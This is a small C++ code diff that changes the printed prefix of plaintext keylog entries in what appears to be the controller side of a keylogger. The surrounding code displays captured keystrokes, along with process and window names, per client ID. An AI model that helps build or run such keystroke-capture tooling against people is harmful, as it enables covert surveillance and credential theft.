@@ -37,7 +37,7 @@ private:
             if (payload.context().processname() != "" || payload.context().windowsname() != "")
                 std::cout << "> Context changed : " << "[ Process:\"" <<payload.context().processname() << "\"" << " Window:\"" << payload.context().windowsname() << "\"]" << std::endl;
             if (payload.plaintextkeylog() != "")
-                std::cout << "> " << payload.plaintextkeylog() << std::endl;
+                std::cout << "==> " << payload.plaintextkeylog() << std::endl;
         }
         std::cout << "--- TOTAL of " << response.keylog_size() << " entries for client with ID [\"" << clientId << "\"] ---" << std::endl;
     }
